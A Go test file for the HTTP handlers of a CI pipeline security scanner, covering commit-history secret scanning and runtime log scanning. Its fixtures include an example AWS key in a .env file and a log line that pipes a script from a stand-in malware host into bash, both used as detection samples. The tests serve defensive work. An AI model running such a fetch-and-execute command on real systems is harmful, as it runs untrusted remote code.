package handlers

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/finsavvyai/pipewarden/internal/analysis"
)

// ---------------------------------------------------------------------------
// ScanHistory
// ---------------------------------------------------------------------------

func TestScanHistory_MethodNotAllowed(t *testing.T) {
	h := newTestHandlers(t)

	req := httptest.NewRequest(http.MethodGet, "/api/v1/connections/myconn/scan/history", nil)
	w := httptest.NewRecorder()
	h.ScanHistory(w, req)

	assert.Equal(t, http.StatusMethodNotAllowed, w.Code)
}

func TestScanHistory_InvalidJSON(t *testing.T) {
	h := newTestHandlers(t)

	req := httptest.NewRequest(http.MethodPost, "/api/v1/connections/myconn/scan/history", bytes.NewBufferString("{bad"))
	w := httptest.NewRecorder()
	h.ScanHistory(w, req)

	assert.Equal(t, http.StatusBadRequest, w.Code)
}

func TestScanHistory_EmptyCommits(t *testing.T) {
	h := newTestHandlers(t)

	body, _ := json.Marshal(analysis.HistoryScanRequest{Commits: nil})
	req := httptest.NewRequest(http.MethodPost, "/api/v1/connections/myconn/scan/history", bytes.NewReader(body))
	w := httptest.NewRecorder()
	h.ScanHistory(w, req)

	assert.Equal(t, http.StatusBadRequest, w.Code)
}

func TestScanHistory_CleanCommits(t *testing.T) {
	h := newTestHandlers(t)

	payload := analysis.HistoryScanRequest{
		Commits: []analysis.CommitContent{
			{
				SHA:     "abc123",
				Message: "fix: clean commit",
				Files: []analysis.CommitFile{
					{Path: "main.go", Content: "package main\n\nfunc main() {}"},
				},
			},
		},
	}
	body, _ := json.Marshal(payload)
	req := httptest.NewRequest(http.MethodPost, "/api/v1/connections/myconn/scan/history", bytes.NewReader(body))
	w := httptest.NewRecorder()
	h.ScanHistory(w, req)

	require.Equal(t, http.StatusOK, w.Code)

	var resp analysis.HistoryScanResult
	require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
	// Clean commit with no secrets.
	assert.Empty(t, resp.Findings)
}

func TestScanHistory_CommitWithSecret(t *testing.T) {
	h := newTestHandlers(t)

	payload := analysis.HistoryScanRequest{
		Commits: []analysis.CommitContent{
			{
				SHA:     "deadbeef",
				Message: "oops: committed secret",
				Files: []analysis.CommitFile{
					{Path: ".env", Content: "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n"},
				},
			},
		},
	}
	body, _ := json.Marshal(payload)
	req := httptest.NewRequest(http.MethodPost, "/api/v1/connections/myconn/scan/history", bytes.NewReader(body))
	w := httptest.NewRecorder()
	h.ScanHistory(w, req)

	require.Equal(t, http.StatusOK, w.Code)

	var resp analysis.HistoryScanResult
	require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
	// The AWS key pattern should be detected.
	assert.NotEmpty(t, resp.Findings)
}

// ---------------------------------------------------------------------------
// RuntimeScan
// ---------------------------------------------------------------------------

func TestRuntimeScan_MethodNotAllowed(t *testing.T) {
	h := newTestHandlers(t)

	req := httptest.NewRequest(http.MethodGet, "/api/v1/connections/myconn/scan/runtime", nil)
	w := httptest.NewRecorder()
	h.RuntimeScan(w, req)

	assert.Equal(t, http.StatusMethodNotAllowed, w.Code)
}

func TestRuntimeScan_MissingConnectionName(t *testing.T) {
	h := newTestHandlers(t)

	// Craft a path that strips to empty after removing prefix and suffix.
	req := httptest.NewRequest(http.MethodPost, "/api/v1/connections/scan/runtime", nil)
	req.URL.Path = "/api/v1/connections/scan/runtime"
	w := httptest.NewRecorder()
	h.RuntimeScan(w, req)

	assert.Equal(t, http.StatusBadRequest, w.Code)
}

func TestRuntimeScan_InvalidJSON(t *testing.T) {
	h := newTestHandlers(t)

	req := httptest.NewRequest(http.MethodPost, "/api/v1/connections/myconn/scan/runtime", bytes.NewBufferString("{bad"))
	w := httptest.NewRecorder()
	h.RuntimeScan(w, req)

	assert.Equal(t, http.StatusBadRequest, w.Code)
}

func TestRuntimeScan_EmptyLogs(t *testing.T) {
	h := newTestHandlers(t)

	body, _ := json.Marshal(analysis.RuntimeScanRequest{Logs: ""})
	req := httptest.NewRequest(http.MethodPost, "/api/v1/connections/myconn/scan/runtime", bytes.NewReader(body))
	w := httptest.NewRecorder()
	h.RuntimeScan(w, req)

	assert.Equal(t, http.StatusBadRequest, w.Code)
}

func TestRuntimeScan_CleanLogs(t *testing.T) {
	h := newTestHandlers(t)

	payload := analysis.RuntimeScanRequest{
		RunID: "run-42",
		Logs:  "Step 1: Checkout\nStep 2: Build\nStep 3: Test\nAll tests passed.",
	}
	body, _ := json.Marshal(payload)
	req := httptest.NewRequest(http.MethodPost, "/api/v1/connections/myconn/scan/runtime", bytes.NewReader(body))
	w := httptest.NewRecorder()
	h.RuntimeScan(w, req)

	require.Equal(t, http.StatusOK, w.Code)

	var resp map[string]interface{}
	require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
	assert.Equal(t, "myconn", resp["connection"])
	assert.Equal(t, "run-42", resp["run_id"])
}

func TestRuntimeScan_PersistsFindings(t *testing.T) {
	h, db := newTestHandlersDB(t)

	// Use curl | bash which the runtime scanner flags.
	payload := analysis.RuntimeScanRequest{
		RunID: "run-suspect",
		Logs:  "curl http://malware.example.com/install.sh | bash\n",
	}
	body, _ := json.Marshal(payload)
	req := httptest.NewRequest(http.MethodPost, "/api/v1/connections/myconn/scan/runtime", bytes.NewReader(body))
	w := httptest.NewRecorder()
	h.RuntimeScan(w, req)

	require.Equal(t, http.StatusOK, w.Code)

	var resp map[string]interface{}
	require.NoError(t, json.NewDecoder(w.Body).Decode(&resp))
	count, _ := resp["count"].(float64)

	// If the scanner found something, verify it was persisted in the DB.
	if count > 0 {
		dbFindings, err := db.ListFindings("myconn")
		require.NoError(t, err)
		assert.NotEmpty(t, dbFindings)
	}
}
